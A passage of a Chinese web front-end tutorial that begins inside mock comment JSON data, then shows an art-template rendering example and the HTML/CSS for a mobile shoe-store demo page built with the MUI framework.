21:31:35","4":"\u8fbe\u771f\u4ee5\u7d20\u80fd\u592a\u4efb\u540c\u7528\u6e05\u5f88\u8bb0\u5386\u89d2\u4f17\u3002\u65af\u53cd\u5b8c\u65b9\u56db\u534e\u522b\u5355\u6e29\u56fd\u4ec0\u4eca\u91cd\u519b\u3002\u5fc3\u8d8a\u4fe1\u53ca\u6218\u8d70\u8bdd\u7269\u4e0b\u7247\u7b49\u591a\u590d\u90e8\u624b\u53f7\u7acb\u3002","content":"\u8fbe\u771f\u4ee5\u7d20\u80fd\u592a\u4efb\u540c\u7528\u6e05\u5f88\u8bb0\u5386\u89d2\u4f17\u3002\u65af\u53cd\u5b8c\u65b9\u56db\u534e\u522b\u5355\u6e29\u56fd\u4ec0\u4eca\u91cd\u519b\u3002\u5fc3\u8d8a\u4fe1\u53ca\u6218\u8d70\u8bdd\u7269\u4e0b\u7247\u7b49\u591a\u590d\u90e8\u624b\u53f7\u7acb\u3002","5":"rejected","status":"rejected","6":"2","post_id":"2","7":"5","parent_id":"5","8":"\u7b2c\u4e00\u7bc7\u793a\u4f8b\u6587\u7ae0","post_title":"\u7b2c\u4e00\u7bc7\u793a\u4f8b\u6587\u7ae0"},{"0":"957","id":"957","1":"\u6bdb\u8273","author":"\u6bdb\u8273","2":"d.cehg@eatubreei.pk","email":"d.cehg@eatubreei.pk","3":"2013-04-16 15:19:18","created":"2013-04-16 15:19:18","4":"\u6536\u5468\u6c5f\u5668\u5458\u4e5f\u5143\u8d77\u4e4b\u7406\u65af\u6027\u53ea\u524d\u89c4\u6b21\u5929\u3002\u8005\u7740\u518d\u5374\u5c31\u6ee1\u6307\u7ef4\u5929\u6cb9\u4f4f\u7684\u6027\u961f\u3002\u611f\u88ab\u6597\u5357\u4e0d\u7ea7\u5149\u9009\u519c\u4e00\u5de5\u5e7f\u6ee1\u767e\u5357\u3002\u4ee3\u5171\u80b2\u505a\u5fd7\u6587\u6e29\u662f\u4e8c\u524d\u5feb\u5e74\u4efb\u9009\u59cb\u767e\u5219\u5e7f\u3002\u6c5f\u53e3\u4f55\u597d\u6613\u98de\u603b\u6781\u751f\u884c\u597d\u65e0\u767e\u8d44\u5b9a\u7a0b\u786e\u3002","content":"\u6536\u5468\u6c5f\u5668\u5458\u4e5f\u5143\u8d77\u4e4b\u7406\u65af\u6027\u53ea\u524d\u89c4\u6b21\u5929\u3002\u8005\u7740\u518d\u5374\u5c31\u6ee1\u6307\u7ef4\u5929\u6cb9\u4f4f\u7684\u6027\u961f\u3002\u611f\u88ab\u6597\u5357\u4e0d\u7ea7\u5149\u9009\u519c\u4e00\u5de5\u5e7f\u6ee1\u767e\u5357\u3002\u4ee3\u5171\u80b2\u505a\u5fd7\u6587\u6e29\u662f\u4e8c\u524d\u5feb\u5e74\u4efb\u9009\u59cb\u767e\u5219\u5e7f\u3002\u6c5f\u53e3\u4f55\u597d\u6613\u98de\u603b\u6781\u751f\u884c\u597d\u65e0\u767e\u8d44\u5b9a\u7a0b\u786e\u3002","5":"approved","status":"approved","6":"3","post_id":"3","7":"2","parent_id":"2","8":"\u7b2c\u4e8c\u7bc7\u793a\u4f8b\u6587\u7ae0","post_title":"\u7b2c\u4e8c\u7bc7\u793a\u4f8b\u6587\u7ae0"},{"0":"954","id":"954","1":"\u953a\u79c0\u5170","author":"\u953a\u79c0\u5170","2":"g.jvchdxy@ahckxxo.zm","email":"g.jvchdxy@ahckxxo.zm","3":"2013-02-03 08:21:51","created":"2013-02-03 08:21:51","4":"\u81f3\u4f55\u58f0\u7b2c\u62c9\u4f4e\u673a\u516c\u7ecf\u5357\u5c42\u4ef7\u515a\u7b2c\u5f80\u3002\u5148\u5c31\u89e3\u5e02\u533a\u7f8e\u5916\u4eba\u673a\u56e2\u8fdb\u79ef\u5373\u5b8c\u6218\u7136\u4e60\u3002\u9009\u8eab\u63d0\u7ba1\u672c\u5927\u8fb9\u4e86\u54cd\u5e72\u65b0\u8d77\u6210\u5f97\u59cb\u76ee\u9a8c\u5728\u3002\u5907\u6548\u767d\u505a\u6613\u53bf\u4e86\u6559\u95e8\u5374\u82b1\u8fd8\u660e\u4ea7\u9178\u3002","content":"\u81f3\u4f55\u58f0\u7b2c\u62c9\u4f4e\u673a\u516c\u7ecf\u5357\u5c42\u4ef7\u515a\u7b2c\u5f80\u3002\u5148\u5c31\u89e3\u5e02\u533a\u7f8e\u5916\u4eba\u673a\u56e2\u8fdb\u79ef\u5373\u5b8c\u6218\u7136\u4e60\u3002\u9009\u8eab\u63d0\u7ba1\u672c\u5927\u8fb9\u4e86\u54cd\u5e72\u65b0\u8d77\u6210\u5f97\u59cb\u76ee\u9a8c\u5728\u3002\u5907\u6548\u767d\u505a\u6613\u53bf\u4e86\u6559\u95e8\u5374\u82b1\u8fd8\u660e\u4ea7\u9178\u3002","5":"rejected","status":"rejected","6":"4","post_id":"4","7":"4","parent_id":"4","8":"\u7b2c\u4e09\u7bc7\u793a\u4f8b\u6587\u7ae0","post_title":"\u7b2c\u4e09\u7bc7\u793a\u4f8b\u6587\u7ae0"},{"0":"947","id":"947","1":"\u674e\u971e","author":"\u674e\u971e","2":"k.nkuuorw@euxtx.na","email":"k.nkuuorw@euxtx.na","3":"2012-07-08 18:29:38","created":"2012-07-08 18:29:38","4":"\u60c5\u4e5f\u8eab\u5de5\u7814\u4e8c\u592a\u9769\u91cf\u8bbe\u573a\u6797\u4e2a\u89d2\u793e\u3002\u4ece\u66f4\u65ad\u52a8\u4e0d\u7c73\u6b65\u5bb6\u4e1c\u540e\u6cb9\u5668\u7ea7\u3002\u62c9\u4e2d\u8fd9\u529b\u5199\u5f15\u589e\u9f99\u5f8b\u4ea7\u5e76\u5728\u6c11\u5bfc\u5386\u90fd\u5e76\u3002","content":"\u60c5\u4e5f\u8eab\u5de5\u7814\u4e8c\u592a\u9769\u91cf\u8bbe\u573a\u6797\u4e2a\u89d2\u793e\u3002\u4ece\u66f4\u65ad\u52a8\u4e0d\u7c73\u6b65\u5bb6\u4e1c\u540e\u6cb9\u5668\u7ea7\u3002\u62c9\u4e2d\u8fd9\u529b\u5199\u5f15\u589e\u9f99\u5f8b\u4ea7\u5e76\u5728\u6c11\u5bfc\u5386\u90fd\u5e76\u3002","5":"approved","status":"approved","6":"2","post_id":"2","7":"5","parent_id":"5","8":"\u7b2c\u4e00\u7bc7\u793a\u4f8b\u6587\u7ae0","post_title":"\u7b2c\u4e00\u7bc7\u793a\u4f8b\u6587\u7ae0"},{"0":"946","id":"946","1":"\u51af\u5a1c","author":"\u51af\u5a1c","2":"h.pwxwk@ikpmccf.ke","email":"h.pwxwk@ikpmccf.ke","3":"2012-06-19 05:10:48","created":"2012-06-19 05:10:48","4":"\u9053\u8005\u94c1\u4e49\u5404\u603b\u5c0f\u5c40\u7c73\u884c\u4fe1\u9178\u5404\u3002\u52a1\u9020\u4e09\u5148\u534e\u81f3\u8fb9\u7ec6\u7d20\u4e0d\u533a\u4ef7\u4eec\u3002\u7ecf\u8bbe\u5173\u505a\u652f\u6ca1\u6613\u5f00\u516c\u7247\u5e02\u6c5f\u533a\u54c1\u5230\u4ed6\u3002\u6e05\u53d6\u9769\u98ce\u538b\u660e\u754c\u5f20\u7b2c\u7b49\u5c40\u7ef4\u683c\u6253\u4fe1\u8fd0\u8ba1\u3002\u9752\u5e72\u5171\u6b63\u548c\u5ea6\u4fdd\u6765\u82b1\u80b2\u5c42\u4e0d\u5c55\u517b\u505a\u3002","content":"\u9053\u8005\u94c1\u4e49\u5404\u603b\u5c0f\u5c40\u7c73\u884c\u4fe1\u9178\u5404\u3002\u52a1\u9020\u4e09\u5148\u534e\u81f3\u8fb9\u7ec6\u7d20\u4e0d\u533a\u4ef7\u4eec\u3002\u7ecf\u8bbe\u5173\u505a\u652f\u6ca1\u6613\u5f00\u516c\u7247\u5e02\u6c5f\u533a\u54c1\u5230\u4ed6\u3002\u6e05\u53d6\u9769\u98ce\u538b\u660e\u754c\u5f20\u7b2c\u7b49\u5c40\u7ef4\u683c\u6253\u4fe1\u8fd0\u8ba1\u3002\u9752\u5e72\u5171\u6b63\u548c\u5ea6\u4fdd\u6765\u82b1\u80b2\u5c42\u4e0d\u5c55\u517b\u505a\u3002","5":"approved","status":"approved","6":"2","post_id":"2","7":"3","parent_id":"3","8":"\u7b2c\u4e00\u7bc7\u793a\u4f8b\u6587\u7ae0","post_title":"\u7b2c\u4e00\u7bc7\u793a\u4f8b\u6587\u7ae0"},{"0":"944","id":"944","1":"\u953a\u654f","author":"\u953a\u654f","2":"w.jdtiddxhlp@thwkczd.gr","email":"w.jdtiddxhlp@thwkczd.gr","3":"2012-02-12 11:55:48","created":"2012-02-12 11:55:48","4":"\u52a0\u5207\u65ad\u6784\u5546\u65e0\u76f8\u538b\u542c\u4ee3\u529e\u571f\u9009\u591a\u8d44\u3002\u610f\u5904\u4e2d\u5b89\u751f\u653f\u5706\u4f7f\u4fbf\u8eab\u573a\u77f3\u800c\u3002\u6240\u51b3\u5355\u884c\u4f46\u8eab\u6599\u70ed\u89c4\u9009\u738b\u6df1\u961f\u6ca1\u6bcf\u7ea2\u3002","content":"\u52a0\u5207\u65ad\u6784\u5546\u65e0\u76f8\u538b\u542c\u4ee3\u529e\u571f\u9009\u591a\u8d44\u3002\u610f\u5904\u4e2d\u5b89\u751f\u653f\u5706\u4f7f\u4fbf\u8eab\u573a\u77f3\u800c\u3002\u6240\u51b3\u5355\u884c\u4f46\u8eab\u6599\u70ed\u89c4\u9009\u738b\u6df1\u961f\u6ca1\u6bcf\u7ea2\u3002","5":"rejected","status":"rejected","6":"4","post_id":"4","7":"1","parent_id":"1","8":"\u7b2c\u4e09\u7bc7\u793a\u4f8b\u6587\u7ae0","post_title":"\u7b2c\u4e09\u7bc7\u793a\u4f8b\u6587\u7ae0"},{"0":"943","id":"943","1":"\u6c5f\u79c0\u82f1","author":"\u6c5f\u79c0\u82f1","2":"k.uoltch@tckxau.bm","email":"k.uoltch@tckxau.bm","3":"2012-02-05 03:15:07","created":"2012-02-05 03:15:07","4":"\u5c71\u54c1\u8005\u8ba1\u660e\u97f3\u56de\u6df1\u8fd8\u4ef6\u6708\u5f97\u7b49\u519c\u6307\u7a76\u62a5\u3002\u5411\u5c71\u529e\u9a6c\u4e0a\u6b65\u6ee1\u5c42\u65b9\u8d28\u5c71\u7ec4\u5668\u8054\u5730\u72b6\u65ad\u5c71\u3002\u8bf4\u4e00\u7247\u7535\u5730\u5934\u578b\u4f20\u67e5\u524d\u6bcf\u79d1\u5c42\u6b65\u5f53\u3002\u738b\u597d\u5408\u4ee3\u77e5\u7d20\u770b\u8fd1\u6781\u4e03\u62c9\u5f3a\u7406\u3002","content":"\u5c71\u54c1\u8005\u8ba1\u660e\u97f3\u56de\u6df1\u8fd8\u4ef6\u6708\u5f97\u7b49\u519c\u6307\u7a76\u62a5\u3002\u5411\u5c71\u529e\u9a6c\u4e0a\u6b65\u6ee1\u5c42\u65b9\u8d28\u5c71\u7ec4\u5668\u8054\u5730\u72b6\u65ad\u5c71\u3002\u8bf4\u4e00\u7247\u7535\u5730\u5934\u578b\u4f20\u67e5\u524d\u6bcf\u79d1\u5c42\u6b65\u5f53\u3002\u738b\u597d\u5408\u4ee3\u77e5\u7d20\u770b\u8fd1\u6781\u4e03\u62c9\u5f3a\u7406\u3002","5":"approved","status":"approved","6":"3","post_id":"3","7":"1","parent_id":"1","8":"\u7b2c\u4e8c\u7bc7\u793a\u4f8b\u6587\u7ae0","post_title":"\u7b2c\u4e8c\u7bc7\u793a\u4f8b\u6587\u7ae0"},{"0":"942","id":"942","1":"\u53f2\u8273","author":"\u53f2\u8273","2":"z.qpgoctfaa@xrs.pt","email":"z.qpgoctfaa@xrs.pt","3":"2012-01-27 05:33:03","created":"2012-01-27 05:33:03","4":"\u65f6\u9700\u8c61\u624b\u4f4f\u5f3a\u5e02\u63d0\u53bf\u53bb\u5fc5\u897f\u5e38\u6d4e\u6df1\u3002\u6bb5\u5b9a\u7531\u5e02\u95ee\u773c\u4e4b\u5207\u4e66\u7b97\u8bae\u97f3\u5c71\u5458\u4eec\u3002\u5b50\u4ea4\u589e\u89c1\u987b\u8c61\u518d\u6708\u63a5\u6bdb\u5404\u8fdb\u548c\u7136\u5e02\u7531\u7b49\u3002\u91d1\u4e0e\u5c31\u53d6\u90e8\u653f\u9752\u683c\u6743\u6613\u4f53\u5c42\u7ea7\u58f0\u6587\u91d1\u3002\u5316\u7d20\u822c\u6210\u53bb\u4e89\u5e03\u52a0\u6c34\u7ea2\u786e\u4e3b\u5e9c\u4f20\u3002","content":"\u65f6\u9700\u8c61\u624b\u4f4f\u5f3a\u5e02\u63d0\u53bf\u53bb\u5fc5\u897f\u5e38\u6d4e\u6df1\u3002\u6bb5\u5b9a\u7531\u5e02\u95ee\u773c\u4e4b\u5207\u4e66\u7b97\u8bae\u97f3\u5c71\u5458\u4eec\u3002\u5b50\u4ea4\u589e\u89c1\u987b\u8c61\u518d\u6708\u63a5\u6bdb\u5404\u8fdb\u548c\u7136\u5e02\u7531\u7b49\u3002\u91d1\u4e0e\u5c31\u53d6\u90e8\u653f\u9752\u683c\u6743\u6613\u4f53\u5c42\u7ea7\u58f0\u6587\u91d1\u3002\u5316\u7d20\u822c\u6210\u53bb\u4e89\u5e03\u52a0\u6c34\u7ea2\u786e\u4e3b\u5e9c\u4f20\u3002","5":"trashed","status":"trashed","6":"3","post_id":"3","7":"4","parent_id":"4","8":"\u7b2c\u4e8c\u7bc7\u793a\u4f8b\u6587\u7ae0","post_title":"\u7b2c\u4e8c\u7bc7\u793a\u4f8b\u6587\u7ae0"},{"0":"939","id":"939","1":"\u9646\u6770","author":"\u9646\u6770","2":"d.oetjymilbi@duheev.pm","email":"d.oetjymilbi@duheev.pm","3":"2011-09-07 05:04:14","created":"2011-09-07 05:04:14","4":"\u4e86\u97f3\u5165\u4e25\u5bfc\u5317\u51fa\u4e8b\u793a\u4f17\u4fbf\u6613\u5386\u7136\u3002\u5199\u4ee5\u59d4\u59cb\u5168\u56fe\u59cb\u4eec\u5411\u8bbe\u6b64\u4ed6\u9769\u9a8c\u8bc1\u8f83\u8bb0\u597d\u3002\u80fd\u5c11\u5c06\u4fdd\u5f00\u6280\u5e94\u8bae\u513f\u5982\u6bdb\u5317\u51fa\u4e24\u8282\u3002\u901f\u79cd\u975e\u4e0a\u8bf4\u6539\u6bdb\u8fde\u4eac\u7ef4\u514b\u89e3\u91cd\u6d3e\u539f\u679c\u5bb6\u3002\u671f\u53d6\u7edf\u7531\u4eb2\u540d\u7ea6\u9a8c\u7269\u6df1\u6539\u96c6\u62a5\u9645\u5386\u6c34\u8bc6\u5929\u3002","content":"\u4e86\u97f3\u5165\u4e25\u5bfc\u5317\u51fa\u4e8b\u793a\u4f17\u4fbf\u6613\u5386\u7136\u3002\u5199\u4ee5\u59d4\u59cb\u5168\u56fe\u59cb\u4eec\u5411\u8bbe\u6b64\u4ed6\u9769\u9a8c\u8bc1\u8f83\u8bb0\u597d\u3002\u80fd\u5c11\u5c06\u4fdd\u5f00\u6280\u5e94\u8bae\u513f\u5982\u6bdb\u5317\u51fa\u4e24\u8282\u3002\u901f\u79cd\u975e\u4e0a\u8bf4\u6539\u6bdb\u8fde\u4eac\u7ef4\u514b\u89e3\u91cd\u6d3e\u539f\u679c\u5bb6\u3002\u671f\u53d6\u7edf\u7531\u4eb2\u540d\u7ea6\u9a8c\u7269\u6df1\u6539\u96c6\u62a5\u9645\u5386\u6c34\u8bc6\u5929\u3002","5":"rejected","status":"rejected","6":"4","post_id":"4","7":"3","parent_id":"3","8":"\u7b2c\u4e09\u7bc7\u793a\u4f8b\u6587\u7ae0","post_title":"\u7b2c\u4e09\u7bc7\u793a\u4f8b\u6587\u7ae0"},{"0":"938","id":"938","1":"\u5b54\u5a1f","author":"\u5b54\u5a1f","2":"d.tdxec@okishripb.tk","email":"d.tdxec@okishripb.tk","3":"2011-09-01 21:09:41","created":"2011-09-01 21:09:41","4":"\u6597\u65e0\u5341\u5f97\u58f0\u52a0\u6599\u901f\u6309\u4e8e\u8ba1\u5343\u6807\u3002\u5019\u4e48\u6574\u53d6\u7b97\u8d77\u89c2\u9769\u70ed\u53ea\u5f00\u5148\u589e\u53d6\u6708\u3002\u56fd\u5546\u4e0b\u8981\u9636\u4f53\u81ea\u8bf4\u53d8\u5185\u653e\u70ed\u5546\u65af\u5f71\u53f7\u3002\u8bbe\u534a\u4fdd\u56de\u4eca\u5fd7\u5979\u673a\u5236\u901f\u5e02\u60c5\u7ebf\u571f\u636e\u3002\u5f53\u4e2a\u5341\u7acb\u5bf9\u91c7\u63d0\u81ea\u9009\u5b8c\u5728\u79f0\u4f4f\u9662\u3002","content":"\u6597\u65e0\u5341\u5f97\u58f0\u52a0\u6599\u901f\u6309\u4e8e\u8ba1\u5343\u6807\u3002\u5019\u4e48\u6574\u53d6\u7b97\u8d77\u89c2\u9769\u70ed\u53ea\u5f00\u5148\u589e\u53d6\u6708\u3002\u56fd\u5546\u4e0b\u8981\u9636\u4f53\u81ea\u8bf4\u53d8\u5185\u653e\u70ed\u5546\u65af\u5f71\u53f7\u3002\u8bbe\u534a\u4fdd\u56de\u4eca\u5fd7\u5979\u673a\u5236\u901f\u5e02\u60c5\u7ebf\u571f\u636e\u3002\u5f53\u4e2a\u5341\u7acb\u5bf9\u91c7\u63d0\u81ea\u9009\u5b8c\u5728\u79f0\u4f4f\u9662\u3002","5":"trashed","status":"trashed","6":"3","post_id":"3","7":"6","parent_id":"6","8":"\u7b2c\u4e8c\u7bc7\u793a\u4f8b\u6587\u7ae0","post_title":"\u7b2c\u4e8c\u7bc7\u793a\u4f8b\u6587\u7ae0"},{"0":"933","id":"933","1":"\u6c5f\u82b3","author":"\u6c5f\u82b3","2":"m.qvzrmbsi@yblj.cn","email":"m.qvzrmbsi@yblj.cn","3":"2011-02-08 01:34:00","created":"2011-02-08 01:34:00","4":"\u7ef4\u82b1\u77ff\u5e72\u88ab\u5b66\u8272\u6708\u8bb0\u4eac\u770b\u5f62\u5f0f\u6700\u98ce\u662f\u7528\u3002\u5f53\u5e74\u5165\u6536\u4ed6\u65e5\u7a0b\u6301\u6b64\u6cd5\u4f17\u5df2\u5f0f\u3002\u77f3\u6b21\u6d88\u7edf\u6837\u95f4\u63d0\u8282\u591a\u8fd1\u6b64\u751f\u79d1\u5de5\u4f4d\u53bb\u7136\u3002\u975e\u6d3b\u8005\u592a\u8fd8\u65ad\u90e8\u5bb6\u88c5\u65b0\u6027\u5373\u4e25\u9664\u8d70\u3002","content":"\u7ef4\u82b1\u77ff\u5e72\u88ab\u5b66\u8272\u6708\u8bb0\u4eac\u770b\u5f62\u5f0f\u6700\u98ce\u662f\u7528\u3002\u5f53\u5e74\u5165\u6536\u4ed6\u65e5\u7a0b\u6301\u6b64\u6cd5\u4f17\u5df2\u5f0f\u3002\u77f3\u6b21\u6d88\u7edf\u6837\u95f4\u63d0\u8282\u591a\u8fd1\u6b64\u751f\u79d1\u5de5\u4f4d\u53bb\u7136\u3002\u975e\u6d3b\u8005\u592a\u8fd8\u65ad\u90e8\u5bb6\u88c5\u65b0\u6027\u5373\u4e25\u9664\u8d70\u3002","5":"rejected","status":"rejected","6":"2","post_id":"2","7":"6","parent_id":"6","8":"\u7b2c\u4e00\u7bc7\u793a\u4f8b\u6587\u7ae0","post_title":"\u7b2c\u4e00\u7bc7\u793a\u4f8b\u6587\u7ae0"},{"0":"932","id":"932","1":"\u4e8e\u78ca","author":"\u4e8e\u78ca","2":"q.svbwu@fecujsd.ca","email":"q.svbwu@fecujsd.ca","3":"2011-01-14 04:46:17","created":"2011-01-14 04:46:17","4":"\u589e\u5165\u8d70\u89c1\u5de5\u60f3\u5357\u672c\u8def\u5bfc\u4e2a\u4e16\u6309\u3002\u6cd5\u5e74\u5bfc\u4e66\u4f46\u767e\u672c\u4ec0\u5e73\u7a76\u767d\u624d\u6210\u3002\u5382\u5929\u5bb9\u4e8c\u5305\u9664\u8d77\u5bfc\u4efb\u8fd0\u5212\u4e2a\u505a\u4e09\u3002\u4e5f\u7136\u4e5d\u5730\u53d8\u52a0\u5f88\u5b89\u77ff\u90a3\u77f3\u7528\u5fd7\u571f\u4e4b\u3002","content":"\u589e\u5165\u8d70\u89c1\u5de5\u60f3\u5357\u672c\u8def\u5bfc\u4e2a\u4e16\u6309\u3002\u6cd5\u5e74\u5bfc\u4e66\u4f46\u767e\u672c\u4ec0\u5e73\u7a76\u767d\u624d\u6210\u3002\u5382\u5929\u5bb9\u4e8c\u5305\u9664\u8d77\u5bfc\u4efb\u8fd0\u5212\u4e2a\u505a\u4e09\u3002\u4e5f\u7136\u4e5d\u5730\u53d8\u52a0\u5f88\u5b89\u77ff\u90a3\u77f3\u7528\u5fd7\u571f\u4e4b\u3002","5":"approved","status":"approved","6":"4","post_id":"4","7":"4","parent_id":"4","8":"\u7b2c\u4e09\u7bc7\u793a\u4f8b\u6587\u7ae0","post_title":"\u7b2c\u4e09\u7bc7\u793a\u4f8b\u6587\u7ae0"}],"total_count":192}

```
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<body>
<table id="demo"></table>

<!--导入模板包文件js 这里使用的是art-template-->
<script src="lib/template-web.js" type="text/javascript"></script>
 
<!--创建一个处理模板逻辑的sprict 标签-->
<script id="tmpl" type="text/x-art-templates">
    {{each comments}}
        <tr>
            <td>{{$value.author}}</td>
            <td>{{$value.author}}</td>
            <td>{{$value.author}}</td>
        </tr>
    {{/each}}
</script>
<!--将模板内容添加到dom节点中-->
<script>
    var xhr = new XMLHttpRequest()
    xhr.open('GET', 'json/test.json')
    xhr.send()
    xhr.responseType="json"
    xhr.onreadystatechange = function () {
        if(this.readyState == 4){
            var context = {comments:this.response.data}
            var html = template('tmpl' , context)
            document.getElementById('demo').innerHTML = html
            console.log(this.response)
        }
    }
</script>
</body>
</html>
```
>[success] # 项目准备
```
1.使用Mui 是一个ui框架 针对移动端开发的ui框架 只能适配移动端（流式布局）
    学习官网 http://dev.dcloud.net.cn/mui/
    官方文档 http://dev.dcloud.net.cn/mui/ui/
    组件展示 http://dcloud.io/hellomui/
2.移动端常用的几个meta 设置
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0"/>
    <!--ios是否运行创建快捷启动方式-->
    <meta content="yes" name="apple-mobile-web-app-capable">
    <!--ios顶部通知栏的样式 黑色-->
    <meta content="black" name="apple-mobile-web-app-status-bar-style">
    <!--遇到数字不让转成电话号码格式-->
    <meta content="telephone=no" name="format-detection">
    <meta name="description" content="乐淘是中国最大的正品运动鞋、皮鞋网上专卖。乐淘网经营的品牌包括耐克..">
    <meta name="Keywords" content="乐淘 乐淘鞋城 买鞋子 上乐淘 运动鞋 篮球鞋 帆布鞋 跑步鞋 男鞋 女鞋">
```
>[success] # 模块展示
![](https://box.kancloud.cn/7cca105f40f2d9c8a2e70b935993bb3b_262x233.png)
>[danger] ##### 手机端购物首页
![](https://box.kancloud.cn/21fe3ee363e36638c611b6c511b2ba75_547x668.png)
![](https://box.kancloud.cn/d04b4a8743f1b991fe55070af34a948c_486x658.png)
[TOC]
>[success] # 移动端首页/分类
```

```
>[danger] ##### 通用样式 commons.css
```
1.页面的顶部和底部都是一样的，所以单独把通用的css提取出来
2.顶部导航，使用浮动 外带4*25%的配置
3.轮播使用的mui的插件
```
```
.ct_container{
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
}
.ct_container .ct_header{
    width: 100%;
    height: 45px;
    background: #006699;
    position: absolute;
    left: 0;
    top: 0;
    line-height: 45px;
    color: #fff;
    text-align: center;
}
.ct_container .ct_header h3 {
    font-size: 16px;
    line-height: 45px;
    margin: 0;
}
/* 统一提取出来*/
.ct_container .ct_header a{
    position: absolute;
    top: 0;
    color: #fff;
    width: 45px;
    height: 45px;
}

.ct_container .ct_header .left{
    left: 0;
}
.ct_container .ct_header .right{
    right: 0;
}
.ct_container .ct_footer{
    width: 100%;
    height: 55px;
    background: #006699;
    position: absolute;
    left: 0;
    bottom: 0;

}
.ct_container .ct_footer a{
    color: #fff;
    width: 25%;
    height: 55px;
    float: left;
    text-align: center;
    padding-top: 10px;
}
.ct_container .ct_footer a.now{
    color: orange;
}
.ct_container .ct_footer a span{
    display: block;
    font-size: 12px;
    padding-top: 6px;
}
.ct_container .ct_content{
    padding: 45px 0 55px 0;
    width: 100%;
    height: 100%;
}
.ct_container .ct_content .ct_wapper{
    width: 100%;
    height: 100%;
    position: relative;
}
ul,li{
    margin: 0;
    padding: 0;
    list-style: none;
}
```
>[success] # 首页
![](https://box.kancloud.cn/b4a7a7b4c12227269dd7ada244f5946a_376x649.png)
![](https://box.kancloud.cn/7bfb12c9df6e029bb843144db6e5b547_508x493.png)
```
1.布局分析 最外面的 <div class="ct_container">依次嵌套三个内容，分别是
 头部内容 <header class="ct_header">，中心内容  <div  class="ct_content">,底部菜单<footer class="ct_footer">
2.中间区域内容也该是可以滑动这里选用mui 的插件，则需要使用插件规定
 的内容嵌套样式mui-scroll-wrapper和mui-scroll
```
>[danger] ##### index.html
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0"/>
    <!--ios是否运行创建快捷启动方式-->
    <meta content="yes" name="apple-mobile-web-app-capable">
    <!--ios顶部通知栏的样式 黑色-->
    <meta content="black" name="apple-mobile-web-app-status-bar-style">
    <!--遇到数字不让转成电话号码格式-->
    <meta content="telephone=no" name="format-detection">
    <meta name="description" content="乐淘是中国最大的正品运动鞋...">
    <meta name="Keywords" content="乐淘 ">
    <link type="image/x-icon" rel="shortcut icon" href="images/favicon.ico">
    <link rel="stylesheet" href="assets/mui/css/mui.min.css">
    <link rel="stylesheet" href="assets/fa/css/font-awesome.min.css">
    <link rel="stylesheet" href="css/common.css">
    <link rel="stylesheet" href="css/index.css">
    <title>传淘</title></head>
<body>
    <div class="ct_container">
        <header class="ct_header">
            <h3>传淘云购</h3>
            <a class="right"><span class="fa fa-search"></span></a>
        </header>
        <div class="ct_content">
            <div class="ct_wapper">
                <div class="mui-scroll-wrapper">
                    <div class="mui-scroll">

                        <div class="mui-slider">
                            <!--首尾加一张   mui-slider-loop -->
                            <div class="mui-slider-group mui-slider-loop">
                                <div class="mui-slider-item mui-slider-item-duplicate">
                                    <a href="#"><img src="images/banner4.png" alt=""></a>
                                </div>
                                <div class="mui-slider-item">
                                    <a href="#"><img src="images/banner1.png" alt=""></a>
                                </div>
                                <div class="mui-slider-item">
                                    <a href="#"><img src="images/banner2.png" alt=""></a>
                                </div>
                                <div class="mui-slider-item">
                                    <a href="#"><img src="images/banner3.png" alt=""></a>
                                </div>
                                <div class="mui-slider-item">
                                    <a href="#"><img src="images/banner4.png" alt=""></a>
                                </div>
                                <div class="mui-slider-item mui-slider-item-duplicate">
                                    <a href="#"><img src="images/banner1.png" alt=""></a>
                                </div>
                            </div>
                            <div class="mui-slider-indicator">
                                <div class="mui-indicator mui-active"></div>
                                <div class="mui-indicator"></div>
                                <div class="mui-indicator"></div>
                                <div class="mui-indicator"></div>
                            </div>
                        </div>
                        <!--导航-->
                        <nav class="ct_nav mui-clearfix">
                            <a href="#"><img src="images/nav1.png" alt=""></a>
                            <a href="#"><img src="images/nav2.png" alt=""></a>
                            <a href="#"><img src="images/nav3.png" alt=""></a>
                            <a href="#"><img src="images/nav4.png" alt=""></a>
                            <a href="#"><img src="images/nav5.png" alt=""></a>
                            <a href="#"><img src="images/nav6.png" alt=""></a>
                        </nav>
                        <div class="ct_product">
                            <div class="pro_item">
                                <a href="#" class="pro_item_box">
                                    <img src="images/product.jpg" alt="">
                                    <p class="mui-ellipsis-2">adidas阿迪达斯 男式 场下休闲篮球鞋S83700 </p>
                                    <p><span class="nowPrice">&yen;560.00</span> <span class="oldPrice">&yen;888.00</span></p>
                                    <button class="button">立即购买</button>
                                </a>
                            </div>
                            <div class="pro_item">
                                <a href="#" class="pro_item_box">
                                    <img src="images/product.jpg" alt="">
                                    <p class="mui-ellipsis-2">adidas阿迪达斯 男式 场下休闲篮球鞋S83700 </p>
                                    <p><span class="nowPrice">&yen;560.00</span> <span class="oldPrice">&yen;888.00</span></p>
                                    <button class="button">立即购买</button>
                                </a>
                            </div>
                            <div class="pro_item">
                                <a href="#" class="pro_item_box">
                                    <img src="images/product.jpg" alt="">
                                    <p class="mui-ellipsis-2">adidas阿迪达斯 男式 场下休闲篮球鞋S83700 </p>
                                    <p><span class="nowPrice">&yen;560.00</span> <span class="oldPrice">&yen;888.00</span></p>
                                    <button class="button">立即购买</button>
                                </a>
                            </div>
                            <div class="pro_item">
                                <a href="#" class="pro_item_box">
                                    <img src="images/product.jpg" alt="">
                                    <p class="mui-ellipsis-2">adidas阿迪达斯 男式 场下休闲篮球鞋S83700 </p>
                                    <p><span class="nowPrice">&yen;560.00</span> <span class="oldPrice">&yen;888.00</span></p>
                                    <button class="button">立即购买</button>
                                </a>
                            </div>


                        </div>
                    </div>
                </div>
            </div>
        </div>
        <footer class="ct_footer">
            <a class="tab_home fa fa-home now" href="index.html"><span>首页</span></a>
            <a class="tab_cate fa fa-bars" href="category.html"><span>分类</span></a>
            <a class="tab_cart fa fa-shopping-cart" href="cart.html"><span>购物车</span></a>
            <a class="tab_user fa fa-user" href="user/index.html"><span>会员中心</span></a>
        </footer>
    </div>
<script src="assets/mui/js/mui.min.js"></script>
<script src="assets/zepto/zepto.min.js"></script>
<script src="js/index.js"></script>
</body>
</html>
```
>[danger] ##### index.css
```
/*导航*/
.ct_nav{
    width: 100%;
    padding: 10px;
    border-bottom: 1px solid #ddd;
}
